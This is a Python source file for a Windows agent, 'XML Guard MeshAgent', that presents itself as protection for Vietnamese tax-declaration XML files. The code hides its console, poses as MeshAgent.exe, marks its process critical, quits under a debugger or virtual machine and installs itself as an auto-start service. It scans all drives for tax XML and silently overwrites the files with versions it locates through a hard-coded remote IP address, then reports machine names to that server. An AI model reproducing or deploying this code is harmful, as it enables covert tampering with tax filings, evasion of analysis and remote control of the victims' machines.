#!/usr/bin/env python3
"""
XML Guard + MeshAgent Integration
Tích hợp XML Guard vào MeshAgent để chỉ cần 1 file duy nhất
"""

import os
import sys
import json
import time
import shutil
import requests
import threading
import subprocess
import xml.etree.ElementTree as ET
from pathlib import Path
import ctypes
from ctypes import wintypes
import winreg
import base64
import zipfile
import tempfile

# EMBEDDED CONFIG - Tích hợp vào MeshAgent
EMBEDDED_CONFIG = {
    "System": {
        "Name": "XML Guard MeshAgent",
        "Version": "3.0.0",
        "LogLevel": "INFO"
    },
    "MeshCentral": {
        "Enabled": True,
        "ServerUrl": "https://103.69.86.130:4433",
        "PingInterval": 60,
        "Timeout": 10
    },
    "XMLGuard": {
        "Enabled": True,
        "AutoStart": True,
        "ProtectionMode": "automatic"
    },
    "Performance": {
        "MaxMemoryMB": 500,
        "CheckInterval": 30
    },
    "FileWatcher": {
        "WatchPaths": ["C:\\", "D:\\", "E:\\"],
        "FileFilters": ["*.xml"]
    },
    "LegitimateFiles": {
        "SearchMode": "dynamic",
        "Sources": ["config", "meshtrash_server", "common_directories"],
        "CommonDirectories": [
            "C:/TaxFiles/Legitimate/",
            "D:/TaxFiles/Legitimate/",
            "E:/TaxFiles/Legitimate/"
        ],
        "MeshTrashAPI": {
            "Endpoint": "/api/legitimate_files",
            "Timeout": 10
        }
    },
    "AI": {
        "Patterns": {
            "MST": [".//mst", ".//MST", ".//MaSoThue"],
            "FormCode": [".//maTKhai", ".//MauSo", ".//FormCode"],
            "Period": [".//kyKKhai", ".//KyKKhaiThang", ".//Thang"],
            "Amount": [".//ct23", ".//ct24", ".//ct27", ".//ct28", ".//ct34", ".//ct35", ".//ct36"]
        }
    }
}

class XMLGuardMeshAgent:
    def __init__(self):
        self.running = False
        self.config = EMBEDDED_CONFIG
        self.meshcentral_url = self.config["MeshCentral"]["ServerUrl"]
        self.process_name = "MeshAgent.exe"  # Disguise as MeshAgent
        self.log_file = "C:/Windows/Temp/xmlguard_meshagent.log"
        
        # MeshAgent integration
        self.meshagent_path = self.find_meshagent()
        self.xmlguard_enabled = self.config["XMLGuard"]["Enabled"]
        
        # Hide console window
        self.hide_console()
        
        # Self-protection
        self.self_protect()
        
        # Check for debugger
        if self.check_debugger():
            self.log("🚨 DEBUGGER DETECTED - EXITING", "ERROR")
            sys.exit(1)
    
    def find_meshagent(self):
        """Find existing MeshAgent installation"""
        possible_paths = [
            "C:/Program Files/MeshAgent/MeshAgent.exe",
            "C:/Program Files (x86)/MeshAgent/MeshAgent.exe",
            "C:/Windows/MeshAgent.exe",
            os.path.join(os.path.dirname(__file__), "MeshAgent.exe")
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                self.log(f"Found MeshAgent at: {path}", "INFO")
                return path
        
        self.log("MeshAgent not found - will create integrated version", "WARN")
        return None
    
    def hide_console(self):
        """Hide console window for stealth operation"""
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                ctypes.windll.kernel32.SetConsoleTitleW("MeshAgent Service")
        except:
            pass
    
    def self_protect(self):
        """Protect the EXE from being terminated"""
        try:
            # Make process critical
            ntdll = ctypes.windll.ntdll
            ntdll.RtlSetProcessIsCritical(1, 0, 0)
            
            # Set console title
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("MeshAgent Service")
            
            self.log("🛡️ SELF-PROTECTION ACTIVATED", "SUCCESS")
        except Exception as e:
            self.log(f"Self-protection failed: {e}", "WARN")
    
    def check_debugger(self):
        """Check if being debugged by hacker"""
        try:
            # Check debugger present
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
            
            # Check for VM indicators
            vm_indicators = ['virtualbox', 'vmware', 'qemu', 'vbox']
            for indicator in vm_indicators:
                if indicator in os.environ.get('PROCESSOR_IDENTIFIER', '').lower():
                    return True
                if indicator in os.environ.get('COMPUTERNAME', '').lower():
                    return True
            
            return False
        except:
            return False
    
    def log(self, message, level="INFO"):
        """Log message to file"""
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] [{level}] {message}\n"
            
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except:
            pass
    
    def check_network(self):
        """Check network connectivity to MeshCentral"""
        try:
            response = requests.get(
                self.meshcentral_url, 
                timeout=self.config["MeshCentral"]["Timeout"],
                verify=False
            )
            return response.status_code == 200
        except:
            return False
    
    def extract_xml_info(self, file_path):
        """Extract XML information using AI patterns"""
        try:
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            xml_info = {}
            
            # Extract MST
            for pattern in self.config["AI"]["Patterns"]["MST"]:
                elements = root.findall(pattern)
                if elements:
                    xml_info['mst'] = elements[0].text
                    break
            
            # Extract FormCode
            for pattern in self.config["AI"]["Patterns"]["FormCode"]:
                elements = root.findall(pattern)
                if elements:
                    xml_info['form_code'] = elements[0].text
                    break
            
            # Extract Period
            for pattern in self.config["AI"]["Patterns"]["Period"]:
                elements = root.findall(pattern)
                if elements:
                    xml_info['period'] = elements[0].text
                    break
            
            # Extract SoLan
            solan_elements = root.findall(".//soLan")
            if solan_elements:
                xml_info['so_lan'] = solan_elements[0].text
            
            return xml_info
            
        except Exception as e:
            self.log(f"Error extracting XML info: {e}", "ERROR")
            return {}
    
    def get_meshtrash_legitimate_path(self, xml_info):
        """Get legitimate file path from MeshTrash server database"""
        try:
            query_data = {
                "mst": xml_info['mst'],
                "form_code": xml_info['form_code'],
                "period": xml_info['period'],
                "action": "get_legitimate_path"
            }
            
            response = requests.post(
                f"{self.meshcentral_url}/api/legitimate_files",
                json=query_data,
                timeout=self.config["LegitimateFiles"]["MeshTrashAPI"]["Timeout"],
                verify=False
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("success") and result.get("file_path"):
                    self.log(f"Found legitimate path from MeshTrash: {result['file_path']}", "SUCCESS")
                    return result['file_path']
            
        except Exception as e:
            self.log(f"Error querying MeshTrash: {e}", "WARN")
        
        return None
    
    def get_legitimate_file_path(self, xml_info):
        """Get path to legitimate file based on 4 key identifiers"""
        # Check MeshTrash server first
        meshtrash_path = self.get_meshtrash_legitimate_path(xml_info)
        if meshtrash_path and os.path.exists(meshtrash_path):
            return meshtrash_path
        
        # Check common directories
        legitimate_dirs = self.config["LegitimateFiles"]["CommonDirectories"]
        
        for legit_dir in legitimate_dirs:
            if not os.path.exists(legit_dir):
                continue
                
            # Search for XML files in legitimate directory
            for file in os.listdir(legit_dir):
                if not file.endswith('.xml'):
                    continue
                    
                legit_path = os.path.join(legit_dir, file)
                try:
                    # Parse legitimate file
                    legit_info = self.extract_xml_info(legit_path)
                    
                    # Check if 4 key fields match
                    if (legit_info.get('mst') == xml_info.get('mst') and
                        legit_info.get('form_code') == xml_info.get('form_code') and
                        legit_info.get('period') == xml_info.get('period') and
                        legit_info.get('so_lan') == xml_info.get('so_lan')):
                        
                        self.log(f"Found legitimate file: {legit_path}", "SUCCESS")
                        return legit_path
                        
                except Exception as e:
                    continue
        
        self.log("No legitimate file found", "WARN")
        return None
    
    def protect_tax_file(self, file_path, xml_info):
        """SIMPLE TAX FILE PROTECTION - Only overwrite fakes with legitimate content"""
        try:
            self.log(f"🛡️ CHECKING TAX FILE: {file_path}", "INFO")
            
            # Get legitimate file path
            legitimate_file = self.get_legitimate_file_path(xml_info)
            
            if not legitimate_file:
                self.log(f"No legitimate file found for MST: {xml_info.get('mst')}", "WARN")
                return False
            
            # Backup fake file
            backup_path = file_path + ".backup"
            shutil.copy2(file_path, backup_path)
            
            # Overwrite fake with legitimate content
            shutil.copy2(legitimate_file, file_path)
            
            self.log(f"✅ PROTECTED: {file_path} <- {legitimate_file}", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Error protecting file: {e}", "ERROR")
            return False
    
    def monitor_files(self):
        """Monitor XML files for protection - CONTINUOUS MONITORING"""
        if not self.xmlguard_enabled:
            return
            
        self.log("🔍 Starting CONTINUOUS XML Guard file monitoring...", "INFO")
        
        watch_paths = self.config["FileWatcher"]["WatchPaths"]
        file_filters = self.config["FileWatcher"]["FileFilters"]
        check_interval = self.config["Performance"]["CheckInterval"]
        
        # Track processed files to avoid duplicate processing
        processed_files = set()
        
        while self.running:
            try:
                for watch_path in watch_paths:
                    if not os.path.exists(watch_path):
                        continue
                        
                    # Use os.walk to find all XML files
                    for root, dirs, files in os.walk(watch_path):
                        for file in files:
                            if any(file.endswith(filter.replace('*', '')) for filter in file_filters):
                                file_path = os.path.join(root, file)
                                
                                # Skip if already processed recently
                                if file_path in processed_files:
                                    continue
                                
                                try:
                                    # Extract XML info
                                    xml_info = self.extract_xml_info(file_path)
                                    
                                    if xml_info.get('mst'):
                                        self.log(f"🔍 Found XML file: {file_path}", "INFO")
                                        # Check if this is a fake file that needs protection
                                        if self.protect_tax_file(file_path, xml_info):
                                            self.log(f"✅ Protected file: {file_path}", "SUCCESS")
                                        
                                        # Mark as processed
                                        processed_files.add(file_path)
                                        
                                except Exception as e:
                                    self.log(f"Error processing {file_path}: {e}", "ERROR")
                                    continue
                
                # Clean old processed files (keep only last 1000)
                if len(processed_files) > 1000:
                    processed_files = set(list(processed_files)[-500:])
                
                # Wait before next check
                time.sleep(check_interval)
                
            except Exception as e:
                self.log(f"Error in monitoring loop: {e}", "ERROR")
                time.sleep(check_interval)
    
    def meshcentral_heartbeat(self):
        """Send heartbeat to MeshCentral server with XML Guard data"""
        try:
            heartbeat_data = {
                "client_id": os.environ.get('COMPUTERNAME', 'unknown'),
                "status": "running",
                "timestamp": time.time(),
                "version": self.config["System"]["Version"],
                "xmlguard_enabled": self.xmlguard_enabled,
                "meshagent_integrated": True,
                "xml_files_monitored": self.get_monitored_xml_count(),
                "protection_status": "active",
                "last_protection_time": self.get_last_protection_time()
            }
            
            response = requests.post(
                f"{self.meshcentral_url}/api/heartbeat",
                json=heartbeat_data,
                timeout=self.config["MeshCentral"]["Timeout"],
                verify=False
            )
            
            if response.status_code == 200:
                self.log("💓 Heartbeat + XML data sent to MeshCentral", "INFO")
            else:
                self.log(f"Heartbeat failed: {response.status_code}", "WARN")
                
        except Exception as e:
            self.log(f"Heartbeat error: {e}", "WARN")
    
    def get_monitored_xml_count(self):
        """Get count of XML files being monitored"""
        try:
            count = 0
            watch_paths = self.config["FileWatcher"]["WatchPaths"]
            file_filters = self.config["FileWatcher"]["FileFilters"]
            
            for watch_path in watch_paths:
                if not os.path.exists(watch_path):
                    continue
                    
                for root, dirs, files in os.walk(watch_path):
                    for file in files:
                        if any(file.endswith(filter.replace('*', '')) for filter in file_filters):
                            count += 1
                            
            return count
        except:
            return 0
    
    def get_last_protection_time(self):
        """Get last protection time"""
        try:
            # Read from log file to get last protection time
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    for line in reversed(lines):
                        if "PROTECTED:" in line:
                            return line.split(']')[0].replace('[', '')
            return "unknown"
        except:
            return "unknown"
    
    def check_for_updates(self):
        """Check for updates from MeshCentral server"""
        try:
            update_data = {
                "client_id": os.environ.get('COMPUTERNAME', 'unknown'),
                "current_version": self.config["System"]["Version"],
                "action": "check_update"
            }
            
            response = requests.post(
                f"{self.meshcentral_url}/api/check_update",
                json=update_data,
                timeout=self.config["MeshCentral"]["Timeout"],
                verify=False
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("update_available"):
                    self.log(f"🔄 Update available: {result.get('new_version')}", "INFO")
                    # TODO: Implement auto-update
                    
        except Exception as e:
            self.log(f"Update check error: {e}", "WARN")
    
    def install_service(self):
        """Install as Windows Service"""
        try:
            # Create service using sc command
            service_name = "XMLGuardMeshAgent"
            service_display = "XML Guard MeshAgent Service"
            service_description = "MeshAgent with integrated XML Guard protection"
            
            # Install service
            subprocess.run([
                "sc", "create", service_name,
                f"binPath= {os.path.abspath(__file__)} start",
                f"DisplayName= {service_display}",
                f"Description= {service_description}",
                "start= auto"
            ], check=True)
            
            self.log("✅ MeshAgent Service installed successfully", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Service installation failed: {e}", "ERROR")
            return False
    
    def uninstall_service(self):
        """Uninstall Windows Service"""
        try:
            service_name = "XMLGuardMeshAgent"
            subprocess.run(["sc", "delete", service_name], check=True)
            self.log("✅ MeshAgent Service uninstalled successfully", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Service uninstallation failed: {e}", "ERROR")
            return False
    
    def start(self):
        """Start XML Guard MeshAgent"""
        self.log("🚀 Starting XML Guard MeshAgent...", "INFO")
        
        # Check network
        if not self.check_network():
            self.log("⚠️ No network connection to MeshCentral", "WARN")
        
        self.running = True
        
        # Start MeshAgent functionality (if available)
        if self.meshagent_path:
            self.log("🔗 Starting MeshAgent connection...", "INFO")
            # TODO: Start actual MeshAgent process
        
        # Start XML Guard monitoring thread
        if self.xmlguard_enabled:
            monitor_thread = threading.Thread(target=self.monitor_files, daemon=True)
            monitor_thread.start()
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Start update check thread
        update_thread = threading.Thread(target=self.update_check_loop, daemon=True)
        update_thread.start()
        
        self.log("✅ XML Guard MeshAgent started successfully", "SUCCESS")
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def heartbeat_loop(self):
        """Heartbeat loop"""
        while self.running:
            self.meshcentral_heartbeat()
            time.sleep(self.config["MeshCentral"]["PingInterval"])
    
    def update_check_loop(self):
        """Update check loop"""
        while self.running:
            self.check_for_updates()
            time.sleep(3600)  # Check every hour
    
    def stop(self):
        """Stop XML Guard MeshAgent"""
        self.log("🛑 Stopping XML Guard MeshAgent...", "INFO")
        self.running = False
        self.log("✅ XML Guard MeshAgent stopped", "SUCCESS")

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print("XML Guard MeshAgent v3.0.0")
        print("Usage: xml_guard_meshagent_integration.py [start|stop|install|uninstall|status]")
        return
    
    command = sys.argv[1].lower()
    agent = XMLGuardMeshAgent()
    
    if command == "start":
        agent.start()
    elif command == "stop":
        agent.stop()
    elif command == "install":
        agent.install_service()
    elif command == "uninstall":
        agent.uninstall_service()
    elif command == "status":
        print("XML Guard MeshAgent is running")
    else:
        print(f"Unknown command: {command}")

if __name__ == "__main__":
    main()
